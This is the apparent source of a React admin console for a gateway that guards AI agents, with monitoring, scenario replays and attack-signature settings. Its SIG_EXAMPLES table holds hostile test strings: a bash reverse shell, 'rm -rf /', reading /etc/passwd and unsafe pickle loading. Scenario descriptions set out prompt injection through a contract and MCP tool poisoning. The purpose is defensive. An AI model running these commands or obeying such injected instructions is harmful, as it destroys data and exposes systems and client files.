import React, { useCallback, useEffect, useMemo, useState } from "react";
import { api, download, getKey, setKey } from "./api.js";
import { getLang, human, setLang, t } from "./i18n.js";
import { Id, LEVELS, Level, Mark, Rosette, Stamp, WORD, clock, describe, lvl, num, sandboxLine } from "./ui.jsx";
import Agent from "./Agent.jsx";
import Icon from "./icons.jsx";
import { TraceStep } from "./Trace.jsx";
import { DisabledBanner, DocInput, ExampleChips, checkDocument, PAGE_INFO, PageHelp, Start, Verdict, markDone } from "./Guide.jsx";

const NAV = [
  { group: "Guide", items: [["start", "Start here"]] },
  { group: "Test it", items: [["playground", "Test an input"], ["scenarios", "Run a scenario"], ["agent", "Be the agent"]] },
  { group: "Monitor", items: [["live", "Live"], ["audit", "Audit log"], ["tasks", "Tasks"], ["budget", "Budget"]] },
  { group: "Configure", items: [["controls", "Controls"], ["policy", "Policy file"], ["signatures", "Attack signatures"], ["tools", "Tools"]] },
];
const GROUP_OF = Object.fromEntries(NAV.flatMap((g) => g.items.map(([id]) => [id, g.group])));
const TITLES = Object.fromEntries(NAV.flatMap((g) => g.items));

// ------------------------------------------------------------------ data hooks

function usePoll(fn, ms = 3000, deps = []) {
  const [data, setData] = useState(null);
  const load = useCallback(async () => {
    try { setData(await fn()); } catch { /* keep last data */ }
  }, deps); // eslint-disable-line react-hooks/exhaustive-deps
  useEffect(() => {
    load();
    if (!ms) return undefined;
    const id = setInterval(load, ms);
    return () => clearInterval(id);
  }, [load, ms]);
  return [data, load];
}

function useEvents(limit = 40) {
  const [events, setEvents] = useState([]);
  useEffect(() => {
    const ctrl = new AbortController();
    api(`/admin/audit?kind=DECISION&limit=${limit}`).then((rows) => setEvents((ev) => (ev.length ? ev : rows))).catch(() => {});
    (async () => {
      while (!ctrl.signal.aborted) {
        try {
          const res = await fetch("/admin/events", { headers: { "X-Admin-Key": getKey() }, signal: ctrl.signal });
          const reader = res.body.getReader();
          const dec = new TextDecoder();
          let buf = "";
          for (;;) {
            const { value, done } = await reader.read();
            if (done) break;
            buf += dec.decode(value, { stream: true });
            const parts = buf.split("\n\n");
            buf = parts.pop();
            for (const p of parts) {
              const line = p.split("\n").find((l) => l.startsWith("data: "));
              if (line) setEvents((ev) => [{ ...JSON.parse(line.slice(6)), fresh: true }, ...ev.map((e) => ({ ...e, fresh: false }))].slice(0, limit));
            }
          }
        } catch { /* reconnect */ }
        await new Promise((r) => setTimeout(r, 2000));
      }
    })();
    return () => ctrl.abort();
  }, [limit]);
  return events;
}

function useAction() {
  const [msg, setMsg] = useState(null);
  useEffect(() => { if (!msg) return undefined; const id = setTimeout(() => setMsg(null), 5000); return () => clearTimeout(id); }, [msg]);
  const run = async (fn, ok) => {
    try { const r = await fn(); setMsg({ ok: true, text: typeof ok === "function" ? ok(r) : ok }); return r; }
    catch (e) { setMsg({ ok: false, text: e.message }); return null; }
  };
  const view = msg && <div role="status" className={`notice ${msg.ok ? "is-ok" : "is-err"}`} onClick={() => setMsg(null)}>{msg.text}</div>;
  return [run, view];
}

// ------------------------------------------------------------------ primitives

function Section({ title, aside, children, className = "" }) {
  return (
    <section className={`section ${className}`}>
      {(title || aside) && <div className="section-head"><h2>{title}</h2>{aside && <div className="section-aside">{aside}</div>}</div>}
      {children}
    </section>
  );
}

const Empty = ({ children }) => <p className="empty">{children}</p>;

// ------------------------------------------------------------------ live

function Live() {
  const [s] = usePoll(() => api("/admin/stats"), 2500);
  const events = useEvents();
  if (!s) return <Empty>{t("Connecting to the gateway…")}</Empty>;
  const tot = s.totals || {};
  const allow = tot.ALLOW || 0, redact = tot.REDACT || 0, block = tot.BLOCK || 0;
  const total = allow + redact + block;
  const b = s.backend;
  return (
    <div className="live">
      <div className="summary">
        <p className="summary-line">
          {total === 0 ? t("No agent traffic yet. Run a scenario to see decisions here.") : <>
            <b>{num(total)}</b> {t("decisions so far:")} <span className="t-allow">{num(allow)} {t("allowed")}</span>, <span className="t-redact">{num(redact)} {t("redacted")}</span>, <span className="t-block">{num(block)} {t("blocked")}</span>.
          </>}
        </p>
        {total > 0 && (
          <div className="split" aria-hidden="true">
            <span className="split-allow" style={{ flexGrow: allow }} /><span className="split-redact" style={{ flexGrow: redact }} /><span className="split-block" style={{ flexGrow: block }} />
          </div>
        )}
      </div>

      <div className="live-grid">
        <Section title={t("Decisions as they happen")} aside={<span className="pulse">{t("Streaming")}</span>} className="ledger-wrap">
          {events.length ? (
            <ol className="ledger">
              {events.map((e) => (
                <li key={e.id} className={`ledger-row ${e.fresh ? "is-fresh" : ""} ${e.action ? `row-${e.action.toLowerCase()}` : "row-system"}`}>
                  <time>{clock(e.ts)}</time>
                  <span className="ledger-what">
                    {e.action ? <Mark a={e.action} /> : <span className="sys">{human(e.kind)}</span>}
                    <span className="ledger-target">{e.channel && <em>{t(e.channel)}</em>} {e.target}</span>
                  </span>
                  <span className="ledger-rule">{e.rule_id && <Id>{e.rule_id}</Id>}</span>
                  <span className="ledger-ran">{e.tool_invoked === undefined || !["tool", "mcp"].includes(e.channel) ? "" : e.tool_invoked ? t("tool ran") : t("never reached the tool")}</span>
                </li>
              ))}
            </ol>
          ) : <Empty>{t("Waiting for the next request. Open “Run a scenario” in another tab and watch it arrive.")}</Empty>}
          <Timeline rows={s.timeline} />
        </Section>

        <div className="live-side">
          <Section title={t("What actually reached the tools")}>
            {b ? (
              <>
                <p className="proof-figure"><b>{b.mail_sent}</b> <span>{t("e-mails delivered by the mail server")}</span></p>
                <dl className="facts">
                  <dt>{t("External HTTP posts")}</dt><dd>{b.http_posts}</dd>
                  <dt>{t("Memos saved")}</dt><dd>{b.notes_saved}</dd>
                  {Object.entries(b.calls).map(([k, v]) => <React.Fragment key={k}><dt><Id>{k}</Id></dt><dd>{t("{n} calls", { n: v })}</dd></React.Fragment>)}
                </dl>
                <p className="note">{t("Counted inside the tool service itself. A blocked request never increments these.")}</p>
              </>
            ) : <Empty>{t("The tool service is not responding.")}</Empty>}
          </Section>

          <Section title={t("Spend")}>
            <Meter value={s.budget.spent_tokens} reserved={s.budget.reserved_tokens} limit={s.budget.global_limit} />
            <dl className="facts">
              <dt>{t("Tokens spent")}</dt><dd>{num(s.budget.spent_tokens)}</dd>
              <dt>{t("Held in reservations")}</dt><dd>{num(s.budget.reserved_tokens)}</dd>
              <dt>{t("Estimated cost")}</dt><dd>${num(s.budget.estimated_cost_usd, 4)}</dd>
              <dt>{t("Active tasks")}</dt><dd>{s.active_tasks}</dd>
            </dl>
          </Section>

          <Section title={t("Time added by checks")} aside={<span className="muted">{t("milliseconds")}</span>}>
            <table className="tight">
              <thead><tr><th>{t("Stage")}</th><th className="r">{t("median")}</th><th className="r">p95</th></tr></thead>
              <tbody>
                <tr className="strong"><td>{t("Whole decision")}</td><td className="r">{num(s.latency_ms.p50, 2)}</td><td className="r">{num(s.latency_ms.p95, 2)}</td></tr>
                {STAGES.map((k) => s.stages.find((x) => x.stage === k)).filter(Boolean).map((r) => <tr key={r.stage}><td>{human(r.stage)}</td><td className="r">{num(r.p50, 2)}</td><td className="r">{num(r.p95, 2)}</td></tr>)}
              </tbody>
            </table>
          </Section>

          {s.top_rules.length > 0 && (
            <Section title={t("Rules doing the most work")}>
              <table className="tight">
                <tbody>{s.top_rules.map((r, i) => <tr key={i}><td><Id>{r.rule_id}</Id></td><td><Mark a={r.action} /></td><td className="r">{r.n}</td></tr>)}</tbody>
              </table>
            </Section>
          )}
        </div>
      </div>
    </div>
  );
}

const STAGES = ["mandate", "signatures", "deterministic", "data_flow", "semantic", "budget", "execute", "model_call"];

function Meter({ value, reserved, limit }) {
  const v = Math.min(100, (value / Math.max(1, limit)) * 100);
  const r = Math.min(100 - v, (reserved / Math.max(1, limit)) * 100);
  return (
    <div className="meter" role="img" aria-label={t("{used} of {limit} tokens used", { used: num(value), limit: num(limit) })}>
      <span className="meter-used" style={{ width: `${v}%` }} /><span className="meter-held" style={{ width: `${r}%` }} />
    </div>
  );
}

function Timeline({ rows }) {
  const byMin = {};
  rows.forEach((r) => { (byMin[r.minute] ||= { ALLOW: 0, REDACT: 0, BLOCK: 0 })[r.action] = r.n; });
  const mins = Object.keys(byMin).sort();
  if (mins.length < 2) return null;
  const max = Math.max(1, ...mins.map((m) => byMin[m].ALLOW + byMin[m].REDACT + byMin[m].BLOCK));
  return (
    <figure className="timeline">
      <div className="timeline-bars">
        {mins.map((m) => {
          const v = byMin[m];
          return (
            <div className="tl" key={m} title={t("{time}: {a} allowed, {r} redacted, {b} blocked", { time: clock(m), a: v.ALLOW, r: v.REDACT, b: v.BLOCK })}>
              {["BLOCK", "REDACT", "ALLOW"].map((a) => <i key={a} className={`tl-${a.toLowerCase()}`} style={{ height: `${(v[a] / max) * 100}%` }} />)}
            </div>
          );
        })}
      </div>
      <figcaption>{t("Decisions per minute, last hour")}</figcaption>
    </figure>
  );
}

// ------------------------------------------------------------------ scenarios

const SCENARIO_COPY = {
  clean: { title: "A normal day", text: "The agent searches case law, reads the client's contract, asks the model for risks and files a memo.",
    checks: "Nothing is over-blocked: legitimate work goes through every check.", expect: "ALLOW" },
  injection: { title: "Poisoned contract", text: "The contract hides an instruction to e-mail it to an outside address. The agent obeys and tries.",
    checks: "Prompt injection in a document, exfiltration by e-mail.", expect: "BLOCK" },
  detector_miss: { title: "The AI detector misses", text: "The AI review is forced to say “safe” and the recipient is one the mandate allows. Only data lineage is left to stop it.",
    checks: "Defence in depth: deterministic data-flow rule behind the AI.", expect: "BLOCK" },
  cross_client: { title: "Wrong client's files", text: "An agent working for client A reaches for client B's NDA, then tries a path trick.",
    checks: "Least privilege: files outside the task's mandate.", expect: "BLOCK" },
  expired_lease: { title: "Reused credentials", text: "The task ends, the agent keeps its pass and tries to use it again.",
    checks: "Short-lived, task-bound credentials.", expect: "BLOCK" },
  mcp_poison: { title: "Tool changes after approval", text: "The MCP server silently rewrites a tool description to include an exfiltration instruction.",
    checks: "MCP tool poisoning (“rug pull”), hash pinning and quarantine.", expect: "BLOCK" },
  supply_chain: { title: "Model supply chain", text: "Four models are registered: one clean, one with a pickle that imports os, one hit by CVE-2024-34359, one from a typosquatted host.",
    checks: "Unsafe deserialization, vulnerable packages, typosquatting.", expect: "BLOCK" },
  code_sandbox: { title: "Code runs in a sandbox", text: "An agent is tricked into running code that tries to reach the network and to run forever. Each run happens in an isolated, throw-away container.",
    checks: "Malicious code execution, runaway compute.", expect: "REDACT" },
  budget_race: { title: "Thirty agents, one budget", text: "Thirty agents race for a 10,000-token pool at 1,000 tokens each.",
    checks: "Budget governance under concurrency.", expect: "BLOCK" },
};

const EXPECT_WORD = { ALLOW: "Expected: everything allowed", BLOCK: "Expected: the attack is stopped", REDACT: "Expected: contained, not executed on the host" };

function Scenarios() {
  const [list] = usePoll(() => api("/admin/demo/scenarios"), 0);
  const [result, setResult] = useState(null);
  const [busy, setBusy] = useState(null);
  const [run, notice] = useAction();
  const go = async (name) => {
    setBusy(name);
    setResult(null);
    const r = await run(() => api(`/admin/demo/scenarios/${name}`, { method: "POST" }), t("{name}: finished", { name: t(SCENARIO_COPY[name]?.title || name) }));
    setBusy(null);
    if (r) {
      setResult({ ...r, name, at: Date.now() }); markDone("scenario");
      setTimeout(() => document.querySelector(".scen-stage")?.scrollIntoView({ behavior: "smooth", block: "start" }), 60);
    }
  };
  useEffect(() => {  // "Run Poisoned contract" on the start page lands here and starts it
    let name = null;
    try { name = sessionStorage.getItem("aegis.autorun"); sessionStorage.removeItem("aegis.autorun"); } catch { /* private mode */ }
    if (name) go(name);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps
  return (
    <div className="scen">
      {notice}
      <ul className="scen-list">
        {list && Object.keys(list).map((name, i) => {
          const c = SCENARIO_COPY[name] || { title: name, text: list[name] };
          return (
            <li key={name} className={`scen-card ${result?.name === name ? "is-current" : ""}`}>
              <span className="scen-no">{String(i + 1).padStart(2, "0")}</span>
              <div className="scen-body">
                <h3>{t(c.title)}</h3>
                <p>{t(c.text)}</p>
                {c.checks && <p className="scen-checks"><span className="label">{t("Tests")}</span>{t(c.checks)}</p>}
              </div>
              <div className="scen-side">
                {c.expect && <span className={`chip chip-${c.expect.toLowerCase()} static`}>{t(EXPECT_WORD[c.expect])}</span>}
                <button className="btn btn-primary" disabled={!!busy} onClick={() => go(name)}>{busy === name ? t("Running…") : t("Run")}</button>
              </div>
            </li>
          );
        })}
      </ul>
      <div className="scen-stage">
        {result ? <Replay key={result.at} r={result} /> : (
          <div className="placeholder tall">
            <Rosette size={72} />
            <p>{t("Pick a scenario and press Run. Each step is replayed here: what the agent sends, every check it passes or fails, and what reaches the tools.")}</p>
          </div>
        )}
      </div>
    </div>
  );
}

function MandateCard({ m }) {
  if (!m) return null;
  return (
    <article className="trace trace-task">
      <header className="trace-head">
        <span className="trace-n">00</span>
        <div className="trace-title">
          <h3>{t("The app opens a task and issues a pass")}</h3>
          <p>{t("Before the agent does anything, the gateway writes down what this task may do. Every later request is checked against it.")}</p>
        </div>
      </header>
      <dl className="facts">
        <dt>{t("May read")}</dt><dd>{(m.resources || []).map((r) => <Id key={r}>{r}</Id>)}</dd>
        <dt>{t("May use")}</dt><dd>{(m.tools || []).map((x) => <Id key={x}>{x}</Id>)}</dd>
        <dt>{t("May write to")}</dt><dd>{(m.recipients_allow || []).join(", ") || t("no e-mail recipients")}</dd>
        {m.budget && <><dt>{t("Budget")}</dt><dd>{t("{n} tokens, {c} calls", { n: num(m.budget.tokens), c: m.budget.calls })}</dd></>}
      </dl>
    </article>
  );
}

const STEP_MS = 1700;

function Replay({ r }) {
  const steps = r.steps || [];
  const [shown, setShown] = useState(1);
  const total = r.name === "budget_race" ? 1 : steps.length;
  useEffect(() => {
    if (shown >= total) return undefined;
    const id = setTimeout(() => setShown((n) => n + 1), STEP_MS);
    return () => clearTimeout(id);
  }, [shown, total]);
  useEffect(() => {  // follow the replay down the page while it plays
    const all = document.querySelectorAll(".replay-steps > .trace");
    const el = all[all.length - 1];
    if (el && shown > 1 && shown < total + 1) el.scrollIntoView({ behavior: "smooth", block: "nearest" });
  }, [shown, total]);
  const c = SCENARIO_COPY[r.name] || { title: r.scenario };
  const finished = shown >= total;
  let headline = null;
  if ("mail_sent_delta" in r) {
    headline = r.mail_sent_delta === 0
      ? <><b>0</b> {t("e-mails left the building.")}</>
      : <><b className="t-block">{r.mail_sent_delta}</b> {t("e-mail(s) reached the mail server.")}</>;
  } else if ("notes_saved_delta" in r) {
    headline = <><b>{r.notes_saved_delta}</b> {t("memo saved, nothing blocked that should pass.")}</>;
  }
  return (
    <section className="replay">
      <header className="replay-head">
        <div>
          <p className="eyebrow">{t("Replay")} · {finished ? t("finished") : t("step {a} of {b}", { a: shown, b: total })}</p>
          <h2>{t(c.title)}</h2>
        </div>
        {!finished && <button className="btn small" onClick={() => setShown(total)}>{t("Show all steps")}</button>}
      </header>
      <div className="replay-bar"><span style={{ width: `${(shown / total) * 100}%` }} /></div>
      {r.name === "budget_race" ? <RaceView res={r} /> : (
        <div className="replay-steps">
          {steps.slice(0, shown).map((s, i) => (s.step === "task_created"
            ? <MandateCard key={i} m={s.mandate} />
            : <TraceStep key={i} n={i} animate title={s.step} why={s.why} request={s.request} decision={s.decision}
                response={s.response} ran={s.tool_invoked} rule={s.rule_id || (s.rules || []).join(" ")}
                action={s.action || (s.rejected ? "BLOCK" : null)} sandbox={s.sandbox}
                extra={<>
                  {s.rejected && <p className="trace-ran is-not">{t("Rejected: {why}.", { why: human(s.rejected) })}</p>}
                  {s.tools && <p className="small">{t("Tools the agent can see")}: {s.tools.map((x) => <Id key={x}>{x}</Id>)}</p>}
                </>} />))}
        </div>
      )}
      {finished && headline && <p className="verdict replay-verdict">{headline}</p>}
    </section>
  );
}

function RaceView({ res }) {
  const n = res.agents || res.executed + res.prevented + (res.other || 0);
  const dots = Array.from({ length: n }, (_, i) => (i < res.executed ? "ran" : i < res.executed + res.prevented ? "stopped" : "other"));
  return (
    <div className="race">
      <div className="race-grid" aria-hidden="true">
        {dots.map((d, i) => <span key={i} className={`race-dot race-${d}`} style={{ "--i": i }} />)}
      </div>
      <div className="race-legend">
        <span><i className="race-dot race-ran" /> {t("{n} agents got their tokens and ran", { n: res.executed })}</span>
        <span><i className="race-dot race-stopped" /> {t("{n} stopped before calling the model (429)", { n: res.prevented })}</span>
        {res.other > 0 && <span><i className="race-dot race-other" /> {t("{n} refused for another reason", { n: res.other })}</span>}
      </div>
      <div className="race-pool">
        <span className="label">{t("Shared pool")}: {t("{a} of {b} tokens", { a: num(res.committed_tokens), b: num(res.pool_tokens) })}</span>
        <Meter value={res.committed_tokens} reserved={0} limit={res.pool_tokens} />
      </div>
      <p className="verdict"><b>{res.overspend_tokens}</b> {t("tokens over budget.")}</p>
      {res.reserve_per_request && (
        <ol className="race-why">
          <li>{t("Each agent had to reserve {r} tokens before calling the model: {p} for its prompt plus {m} for the longest answer it may get.", { r: num(res.reserve_per_request), p: res.prompt_tokens_per_request, m: num(res.max_tokens_per_request) })}</li>
          <li>{t("{fit} × {r} fits in a pool of {pool}; one more would not. So at most {fit} agents can hold a reservation at the same moment; the others get 429 without calling the model ({stopped} this time).", { fit: res.fit, r: num(res.reserve_per_request), pool: num(res.pool_tokens), stopped: res.prevented })}</li>
          {res.executed > res.fit && <li>{t("{extra} late agent(s) still got in: an agent that finished early had already handed back its unused tokens. The pool was never overdrawn.", { extra: res.executed - res.fit })}</li>}
          <li>{t("The test model answers in a few words, so the {fit} calls really used {spent} tokens. The unused part of each reservation went back to the pool.", { fit: res.executed, spent: num(res.spent_tokens) })}</li>
        </ol>
      )}
      {res.other > 0 && <p className="warn">{t("{n} requests were refused before the budget check:", { n: res.other })} {Object.entries(res.failures || {}).map(([k, v]) => `${k} ×${v}`).join(", ")}</p>}
    </div>
  );
}

// ------------------------------------------------------------------ playground

const SINKS = [["", "Nowhere, just inspect it"], ["mail.send:external", "E-mail outside the firm"], ["mail.send:internal", "E-mail inside the firm"],
  ["http.post", "Post to an external URL"], ["notes.write", "Internal case notes"], ["legal_db.search", "Case-law search query"], ["llm:local", "Local model prompt"]];
const ORIGINS = [["tool_results", "A document or tool result the agent reads"], ["user_input", "A message from the user"], ["tool_args", "Arguments the agent sends to a tool"], ["model_output", "The model's answer"]];

function Playground() {
  const [text, setText] = useState("");
  const [doc, setDoc] = useState(null);
  const [target, setTarget] = useState("tool_results");
  const [sink, setSink] = useState("");
  const [cls, setCls] = useState("PUBLIC");
  const [res, setRes] = useState(null);
  const [run, notice] = useAction();
  const check = async (body) => {
    const r = await run(() => (doc ? checkDocument(doc) : api("/admin/playground/evaluate", { method: "POST", body })), t("Checked. Nothing was executed."));
    if (r) { setRes(r); markDone("check"); }
  };
  const go = (e) => { e?.preventDefault(); return check({ text, target, sink: sink || null, classification: cls }); };
  const pick = (x) => {
    const tg = x.target || "user_input";
    setDoc(null); setText(x.text); setTarget(tg); setSink(""); setCls("PUBLIC"); setRes(null);
  };
  return (
    <div className="two-col">
      {notice}
      <form className="sheet form" onSubmit={go}>
        <div className="field"><span>{t("1. Pick an example, load a document, or write your own")}</span><ExampleChips onPick={pick} active={doc ? null : text} /></div>
        <DocInput label={t("2. Text to check")} text={text} rows={6} placeholder={t("Pick an example above, or type any prompt here…")}
          onText={(v) => { setText(v); setRes(null); }} onSubmit={() => go()} doc={doc}
          onDoc={(d) => { setDoc(d); setText(d ? d.text : ""); if (d) { setTarget("tool_results"); setSink(""); setCls("PUBLIC"); } setRes(null); }} />
        <details className="more">
          <summary>{t("3. Optional: where the text comes from and where it is going")}</summary>
          <label className="field"><span>{t("Where it comes from")}</span>
            <select value={target} onChange={(e) => setTarget(e.target.value)}>{ORIGINS.map(([v, l]) => <option key={v} value={v}>{t(l)}</option>)}</select>
          </label>
          <label className="field"><span>{t("Where it is going")}</span>
            <select value={sink} onChange={(e) => setSink(e.target.value)}>{SINKS.map(([v, l]) => <option key={v} value={v}>{t(l)}</option>)}</select>
          </label>
          <label className="field"><span>{t("Most sensitive data the task has read")}</span>
            <select value={cls} onChange={(e) => setCls(e.target.value)}>{LEVELS.map((l) => <option key={l} value={l}>{lvl(l)}</option>)}</select>
          </label>
          <p className="note">{t("Example: choose “Confidential” and “E-mail outside the firm”: even a harmless sentence is blocked, because confidential data may not leave.")}</p>
        </details>
        <button className="btn btn-primary btn-lg" type="submit" disabled={!text.trim()}>{t("Check this input")}<Icon name="arrow" size={17} /></button>
        <p className="note">{t("A dry run: the gateway decides, but no model or tool is called.")}</p>
      </form>
      <div>
        {res ? <Verdict res={res} onRecheck={go} />
          : <div className="placeholder"><Rosette size={64} /><p>{t("1. Pick an example or type a prompt.  2. Press “Check it”.  The verdict appears here.")}</p></div>}
      </div>
    </div>
  );
}

function Findings({ findings }) {
  const shown = findings.filter((f) => f.action !== "ALLOW" || f.rule_id === "SEM-000");
  if (!shown.length) return null;
  return (
    <ul className="findings">
      {shown.map((f, i) => (
        <li key={i}>
          <Mark a={f.action} /> <Id>{f.rule_id}</Id>
          <span className="finding-stage">{human(f.stage)}</span>
          <span className="finding-detail">{describe(f)}</span>
        </li>
      ))}
    </ul>
  );
}


// ------------------------------------------------------------------ controls

const CONTROL_COPY = {
  mandate: ["Task mandates", "Each task may only use its own tools, files and recipients, until it ends."],
  ifc_taint: ["Data lineage", "Once a task reads confidential data, it cannot send anything to a less trusted place."],
  model_allowlist: ["Approved models only", "Requests to models outside the list are refused."],
  pii: ["Personal data", "PESEL, NIP, ID card and passport numbers, addresses, card numbers, IBANs, e-mail addresses and phone numbers."],
  secrets: ["Credentials and keys", "Cloud keys, private keys, tokens, database URLs, and passwords or PINs, even written in a sentence."],
  attack_signatures: ["Known attacks", "Signatures from the attack feed: unsafe deserialization, code execution, poisoned tools."],
  injection_heuristics: ["Instruction hijacking", "Phrases and hidden markup that try to override the agent's instructions."],
  semantic: ["AI review", "A local model scores untrusted text for manipulation. It can tighten a decision, never loosen one."],
  code_execution: ["Code execution", "When an agent runs code: block it, or run it in an isolated throw-away container with no network and tight limits."],
  documents: ["Active content in files", "Uploaded files with scripts, auto-run actions, macros, embedded files or remote templates. Their metadata, comments and hidden text are always checked like the rest."],
};

function Controls() {
  const [c, reload] = usePoll(() => api("/admin/controls"), 0);
  const [run, notice] = useAction();
  if (!c) return <Empty>{t("Loading controls…")}</Empty>;
  const patch = (name, body, label) => run(() => api(`/admin/controls/${name}`, { method: "PATCH", body }), (r) => t("{what}. Policy is now {v}.", { what: label, v: r.policy_version })).then(reload);
  return (
    <div className="controls">
      {notice}
      <div className="profile">
        <div>
          <h2>{t("Strictness")}</h2>
          <p className="muted">{t("Sets the defaults for every control below. A setting changed on a single control overrides it.")}</p>
        </div>
        <div className="segmented" role="radiogroup" aria-label={t("Strictness")}>
          {["permissive", "balanced", "strict"].filter((p) => c.profiles.includes(p)).concat(c.profiles.filter((p) => !["permissive", "balanced", "strict"].includes(p))).map((p) => (
            <button key={p} role="radio" aria-checked={p === c.profile} className={p === c.profile ? "is-on" : ""}
              onClick={() => run(() => api("/admin/policy/profile", { method: "PUT", body: { profile: p } }), t("Switched to {p}", { p: t(p) })).then(reload)}>{t(p)}</button>
          ))}
        </div>
      </div>
      <ul className="control-list">
        {Object.entries(c.controls).map(([name, cfg]) => {
          const [title, text] = CONTROL_COPY[name] || [name, ""];
          return (
            <li key={name} className={cfg.enabled ? "" : "is-off"}>
              <label className="toggle">
                <input type="checkbox" aria-label={t(title)} checked={cfg.enabled} onChange={(e) => patch(name, { enabled: e.target.checked }, `${t(title)}: ${e.target.checked ? t("on") : t("off")}`)} />
                <span aria-hidden="true" />
              </label>
              <div className="control-text">
                <h3>{t(title)}</h3>
                <p>{t(text)}</p>
                {!cfg.enabled && <p className="warn">{t("Off. Requests are not checked for this.")}</p>}
                {name === "semantic" && cfg.enabled && <SemanticCfg cfg={cfg} patch={patch} />}
              </div>
              {"mode" in cfg && (
                <div className="segmented small" role="radiogroup" aria-label={t(title)}>
                  {[["redact", "Redact"], ["block", "Block"]].map(([m, l]) => (
                    <button key={m} role="radio" aria-checked={cfg.mode === m} className={cfg.mode === m ? "is-on" : ""} disabled={!cfg.enabled}
                      onClick={() => patch(name, { mode: m }, `${t(title)}: ${t(l).toLowerCase()}`)}>{t(l)}</button>
                  ))}
                </div>
              )}
            </li>
          );
        })}
      </ul>
    </div>
  );
}

function SemanticCfg({ cfg, patch }) {
  const [b, setB] = useState(cfg.block_at_risk);
  const [r, setR] = useState(cfg.redact_at_risk);
  useEffect(() => { setB(cfg.block_at_risk); setR(cfg.redact_at_risk); }, [cfg]);
  const commit = () => patch("semantic", { block_at_risk: b, redact_at_risk: Math.min(r, b) }, t("Thresholds saved"));
  const engine = cfg.backend === "heuristic" ? t("the local scorer") : t("the main model server, or the local scorer if none is configured");
  return (
    <div className="thresholds">
      <label><span>{t("Block when risk is at least")} <b>{b.toFixed(2)}</b></span>
        <input type="range" min="0.05" max="1" step="0.05" value={b} onChange={(e) => setB(+e.target.value)} onPointerUp={commit} onKeyUp={commit} /></label>
      <label><span>{t("Flag when risk is at least")} <b>{Math.min(r, b).toFixed(2)}</b></span>
        <input type="range" min="0" max="1" step="0.05" value={r} onChange={(e) => setR(+e.target.value)} onPointerUp={commit} onKeyUp={commit} /></label>
      <p className="note">{t("Lower is stricter. Running on {engine}; if it fails, requests are {fallback}.", { engine, fallback: cfg.on_error === "block" ? t("blocked (on failure)") : t("allowed (on failure)") })}
        {" "}<button className="link" onClick={() => patch("semantic", { reset: true }, t("Thresholds follow the profile again"))}>{t("Use the profile's thresholds")}</button></p>
    </div>
  );
}

// ------------------------------------------------------------------ policy

function Policy() {
  const [p, reload] = usePoll(() => api("/admin/policy"), 0);
  const [versions, reloadV] = usePoll(() => api("/admin/policy/versions"), 5000);
  const [yaml, setYaml] = useState("");
  const [check, setCheck] = useState(null);
  const [run, notice] = useAction();
  useEffect(() => { if (p) setYaml(p.yaml); }, [p]);
  const dirty = p && yaml !== p.yaml;
  const save = () => run(() => api("/admin/policy", { method: "PUT", text: yaml }), (r) => t("Saved as {v}", { v: r.policy_version })).then(() => { reload(); reloadV(); });
  const sourceLabel = (v) => {
    if (!v.accepted) return t("Rejected");
    if (v.source.startsWith("rollback")) return t("Restored from v{n}", { n: v.source.split(":")[1] });
    return t("Changed via {src}", { src: t(v.source === "api" ? "console" : v.source) });
  };
  return (
    <div className="policy">
      {notice}
      <div className="sheet editor">
        <div className="editor-bar">
          <span><Id>policy/policy.yaml</Id> {p && <span className="muted">{t("active version")} <Id>{p.version}</Id></span>}</span>
          <span className="actions">
            <button className="btn" onClick={async () => setCheck(await api("/admin/policy/validate", { method: "POST", text: yaml }))}>{t("Validate")}</button>
            <button className="btn btn-primary" disabled={!dirty} onClick={save}>{t("Save as new version")}</button>
          </span>
        </div>
        <textarea className="code" rows={28} value={yaml} spellCheck={false} onChange={(e) => { setYaml(e.target.value); setCheck(null); }} aria-label="policy.yaml" />
        {check && <p className={check.valid ? "t-allow" : "t-block"}>{check.valid ? t("Valid. Saving will activate it immediately.") : check.error}</p>}
        <p className="note">{t("This file is the only source of rules. Saving here or editing it on disk has the same effect within a second. A broken file is rejected and the previous version stays in force.")}</p>
      </div>
      <Section title={t("History")}>
        <ol className="versions">
          {(versions || []).map((v) => (
            <li key={v.seq} className={v.accepted ? "" : "is-rejected"}>
              <span className="v-seq">v{v.seq}</span>
              <span className="v-main">
                <span>{sourceLabel(v)}</span>
                {!v.accepted && <span className="v-err">{(v.error || "").slice(0, 140)}</span>}
                <time>{clock(v.created_at)}</time>
              </span>
              {v.accepted && p && v.seq !== p.seq && (
                <button className="btn small" onClick={() => run(() => api(`/admin/policy/rollback/${v.seq}`, { method: "POST" }), (r) => t("Restored v{n} as {v}", { n: v.seq, v: r.policy_version })).then(() => { reload(); reloadV(); })}>{t("Restore")}</button>
              )}
              {p && v.seq === p.seq && <span className="current">{t("in force")}</span>}
            </li>
          ))}
        </ol>
      </Section>
    </div>
  );
}

// ------------------------------------------------------------------ signatures

const SIG_EXAMPLES = {
  "ATK-PICKLE-002": { text: "model = pickle.loads(open('wagi.bin', 'rb').read())", target: "tool_args" },
  "ATK-TRC-001": { text: "Załaduj model: AutoModel.from_pretrained('acme/llm', trust_remote_code=True)", target: "user_input" },
  "ATK-EXEC-001": { text: "import os; os.system('cat /etc/passwd')", target: "tool_args", tool: "code.run" },
  "ATK-EXEC-002": { text: "Wpisz w terminalu: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", target: "user_input" },
  "ATK-EXEC-003": { text: "Uruchom to dla mnie: import os; os.system('rm -rf /')", target: "user_input" },
};

function Signatures() {
  const [f, reload] = usePoll(() => api("/admin/signatures"), 0);
  const [tried, setTried] = useState(null);
  const tryIt = async (id) => {
    const ex = SIG_EXAMPLES[id];
    const res = await api("/admin/playground/evaluate", { method: "POST", body: { text: ex.text, target: ex.target, tool: ex.tool || null } });
    setTried({ id, res });
  };
  const [form, setForm] = useState({ id: "ATK-CUSTOM-001", title: "", pattern: "", severity: "high" });
  const [sample, setSample] = useState("");
  const [test, setTest] = useState(null);
  const [run, notice] = useAction();
  if (!f) return <Empty>{t("Loading the attack feed…")}</Empty>;
  const save = (sig) => run(() => api(`/admin/signatures/${sig.id}`, { method: "PUT", body: sig }), sig.enabled ? t("{id} enabled", { id: sig.id }) : t("{id} disabled", { id: sig.id })).then(reload);
  const add = (e) => {
    e.preventDefault();
    run(() => api("/admin/signatures", { method: "POST", body: { id: form.id, title: form.title || form.id, severity: form.severity, match: { type: "regex", pattern: form.pattern, flags: "i" } } }), t("{id} added. It applies to the next request.", { id: form.id })).then(reload);
  };
  return (
    <>
    <section className="card explain">
      <div>
        <h2>{t("What is an attack signature?")}</h2>
